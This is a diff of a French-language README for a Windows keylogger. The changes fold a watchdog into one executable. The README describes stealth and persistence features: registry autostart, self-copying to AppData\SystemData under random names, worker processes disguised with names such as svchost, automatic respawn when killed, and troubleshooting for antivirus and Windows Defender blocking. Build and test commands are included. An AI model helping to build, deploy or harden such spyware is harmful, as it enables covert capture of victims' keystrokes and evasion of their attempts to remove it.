@@ -41,37 +41,9 @@ USE_RANDOM_NAMES = True    # ✅ Activé
 
 ## 🚀 Utilisation
 
-### Option 1 : Avec Watchdog (Recommandé)
+### Un Seul Fichier .exe - Tout Intégré !
 
-Le watchdog garantit que le keylogger redémarre toujours, même s'il est tué.
-
-**Étapes :**
-
-1. **Builder le projet**
-   ```powershell
-   python tools/builder_advanced.py
-   ```
-
-2. **Compiler le watchdog** (si pas déjà compilé)
-   ```powershell
-   pyinstaller --onefile --noconsole src/windows/watchdog_launcher.py
-   ```
-
-3. **Lancer le watchdog**
-   ```powershell
-   dist/watchdog_launcher.exe
-   ```
-
-**Ce qui se passe :**
-- Le watchdog se lance
-- Il installe la persistence pour lui-même
-- Il lance le keylogger avec un nom aléatoire
-- Si le keylogger est tué, le watchdog le relance avec un nouveau nom
-- Si le PC redémarre, le watchdog se relance automatiquement
-
-### Option 2 : Sans Watchdog (Persistence Simple)
-
-Le keylogger s'installe pour démarrer au boot, mais ne redémarre pas automatiquement s'il est tué.
+Le watchdog est maintenant **intégré directement** dans le keylogger. Un seul fichier fait tout !
 
 **Étapes :**
 
@@ -85,11 +57,31 @@ Le keylogger s'installe pour démarrer au boot, mais ne redémarre pas automatiq
    build/dist/[nom].exe
    ```
 
-**Ce qui se passe :**
-- Le keylogger s'installe dans le registre
-- Se copie dans `AppData\SystemData` avec un nom aléatoire
-- Redémarre automatiquement au prochain boot
-- Mais ne redémarre PAS s'il est tué manuellement
+**Ce qui se passe automatiquement :**
+- ✅ Le programme démarre en **mode watchdog**
+- ✅ Installe la **persistence** dans le registre
+- ✅ Se copie dans `AppData\SystemData` avec un **nom aléatoire**
+- ✅ Lance un processus **worker** (qui fait le keylogging)
+- ✅ **Surveille** le worker en permanence
+- ✅ Si le worker est tué → **redémarre** automatiquement avec nouveau nom
+- ✅ Au boot du PC → **redémarre** automatiquement
+- ✅ **Redémarrages illimités**
+
+### Comment ça Fonctionne ?
+
+Quand vous lancez le .exe, il fonctionne en 2 modes :
+
+**Mode 1 : Watchdog** (par défaut)
+- Lancé quand vous double-cliquez sur le .exe
+- S'installe pour démarrer au boot
+- Lance le mode Worker et le surveille
+- Redémarre le Worker s'il est tué
+
+**Mode 2 : Worker** (automatique)
+- Lancé par le Watchdog avec l'argument `--worker`
+- Fait le vrai travail de keylogging
+- Utilise un nom aléatoire différent à chaque lancement
+- Surveillé par le Watchdog parent
 
 ## 🔍 Vérification
 
@@ -182,16 +174,19 @@ ENABLE_PERSISTENCE = False
 USE_RANDOM_NAMES = False
 ```
 
-## 📊 Comparaison des Options
+## 📊 Fonctionnalités Intégrées
 
-| Feature | Sans Watchdog | Avec Watchdog |
-|---------|--------------|---------------|
-| Démarre au boot | ✅ | ✅ |
-| Noms aléatoires | ✅ | ✅ |
-| Redémarre si tué | ❌ | ✅ |
-| Changement de nom à chaque redémarrage | ❌ | ✅ |
-| Surveillance continue | ❌ | ✅ |
-| Redémarrages illimités | ❌ | ✅ |
+Le watchdog est maintenant **toujours actif** par défaut :
+
+| Feature | Status |
+|---------|--------|
+| Démarre au boot | ✅ Oui |
+| Noms aléatoires | ✅ Oui |
+| Redémarre si tué | ✅ Oui (5 sec) |
+| Changement de nom à chaque redémarrage | ✅ Oui |
+| Surveillance continue | ✅ Oui |
+| Redémarrages illimités | ✅ Oui |
+| Un seul fichier .exe | ✅ Oui |
 
 ## ⚠️ Avertissements
 
@@ -227,21 +222,24 @@ eventvwr.msc
 # Aller à : Windows Logs > Application
 ```
 
-### Le Watchdog Ne Redémarre Pas
+### Le Worker Ne Redémarre Pas
 
 **Vérifiez :**
-1. Le watchdog est bien lancé
+1. Le processus watchdog (nom aléatoire) est toujours actif
 2. Pas bloqué par l'antivirus
-3. Le fichier principal existe
+3. Le dossier AppData\SystemData existe et contient les copies
 
 **Test :**
 ```powershell
-# Tuer le processus manuellement
-taskkill /F /IM [nom_processus].exe
+# Ouvrir le Gestionnaire de tâches
+# Trouver le processus worker (ex: svchost, RuntimeBroker, etc.)
+taskkill /F /IM [nom_worker_processus].exe
 
 # Observer dans le Gestionnaire de tâches
-# Un nouveau processus devrait apparaître dans 5 secondes
+# Un nouveau processus avec un NOUVEAU NOM devrait apparaître dans 5 secondes
 ```
+
+**Conseil :** Le watchdog et le worker ont des noms différents. Le watchdog ne doit PAS être tué.
 
 ### Processus Bloqué par Windows Defender
 
@@ -259,11 +257,15 @@ taskkill /F /IM [nom_processus].exe
 
 ## 📝 Notes
 
-- Le watchdog et le keylogger sont deux exécutables séparés
-- Le watchdog surveille le keylogger
-- Le watchdog lui-même n'a pas besoin d'être surveillé (il s'auto-installe)
-- Chaque redémarrage génère un nouveau nom de processus
-- Les anciens fichiers sont automatiquement nettoyés
+- **Un seul fichier .exe** fait tout (watchdog + keylogger intégré)
+- Le watchdog s'installe et lance automatiquement le worker
+- Le worker fait le vrai keylogging
+- Chaque redémarrage du worker génère un **nouveau nom aléatoire**
+- Les anciens fichiers workers sont automatiquement nettoyés
+- Le watchdog reste actif en arrière-plan
+- Vous verrez **2 processus** dans le Gestionnaire de tâches :
+  1. **Watchdog** - Surveillance et relance
+  2. **Worker** - Keylogging (nom change à chaque redémarrage)
 
 ---
 
